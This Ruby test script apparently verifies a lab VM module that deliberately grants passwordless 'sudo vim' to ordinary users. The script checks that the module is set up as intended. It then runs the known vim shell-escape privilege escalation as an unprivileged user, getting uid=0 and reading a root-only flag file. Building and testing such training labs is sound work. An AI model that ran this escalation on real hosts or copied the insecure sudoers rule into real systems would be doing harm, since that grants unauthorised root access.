require_relative '../../../../../lib/post_provision_test'


class SudoRootVimTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_vim'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # Inputs: leaked_filenames and strings_to_leak are both checked below.
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('vim installed', 'test -x /usr/bin/vim && echo vim-present', 'vim-present')
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_vim", 'root:root 440')
      test_local_command('sudoers rule allows vim as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_vim', 'NOPASSWD: /usr/bin/vim *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list_vim', 'NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers syntax valid', 'visudo -c 2>&1', 'parsed OK')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      test_local_command('unprivileged user lists the vim sudo rule', 'sudo -n -l', '/usr/bin/vim *', user: 'nobody')
      # the misconfiguration: vim's :! runs a command as root (GTFOBins vim, sudo);
      # -es keeps it non-interactive, output goes to a file as ex mode swallows it
      out = '/tmp/secgen_vim_t2'
      cmd = %Q{sudo -n /usr/bin/vim -u NONE -es -c '!id > #{out}' -c 'q!'; cat #{out}; rm -f #{out}}
      test_local_command('unprivileged user runs a command as root via sudo vim', cmd, 'uid=0(root)', user: 'nobody')
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        flag = Shellwords.escape("/root/#{fname}")
        read_cmd = %Q{sudo -n /usr/bin/vim -u NONE -es -c '!cat #{flag} > #{out}' -c 'q!'; cat #{out}; rm -f #{out}}
        test_local_command("unprivileged user reads leaked #{fname} via sudo vim", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
      end
    end
    tier(3) do
      # <privilege>root_rwx</privilege>: the escalation must land a root shell
      # (uid=0). No Metasploit module and no attacker VM for this GTFOBins
      # technique, so the proof is local: with_throwaway_ssh_user makes a fresh,
      # disposable unprivileged account (and removes it afterwards) — a realistic
      # student foothold, not the service `nobody` account tier 2 used — which
      # then escalates to root through `sudo vim` and reads the root-only flag.
      flag_name = leaked.first
      flag_string = strings.first.to_s.strip.lines.first.to_s.strip
      out = '/tmp/secgen_vim_t3'
      with_throwaway_ssh_user do |user, _pass|
        # GTFOBins (vim, sudo): vim's :! runs a shell command, and sudo runs vim
        # as root, so the command runs as root; -es drives ex mode non-interactively.
        # id proves uid=0 (the escalation); the sentinel is root-owned 0644 so the
        # throwaway user can read it back, then it is removed.
        esc = %Q{sudo -n /usr/bin/vim -u NONE -es -c '!id > #{out}' -c 'q!'; cat #{out}; rm -f #{out}}
        test_local_command("throwaway user #{user} escalates to a root shell via sudo vim",
                           esc, 'uid=0(root)', user: user)

        if flag_name && !flag_string.empty?
          flag = Shellwords.escape("/root/#{flag_name}")
          read = %Q{sudo -n /usr/bin/vim -u NONE -es -c '!cat #{flag} > #{out}' -c 'q!'; cat #{out}; rm -f #{out}}
          test_local_command("throwaway user #{user} reads root-only #{flag_name} via sudo vim",
                             read, flag_string, user: user)
        end
      end
    end
  end

end

SudoRootVimTest.new.run
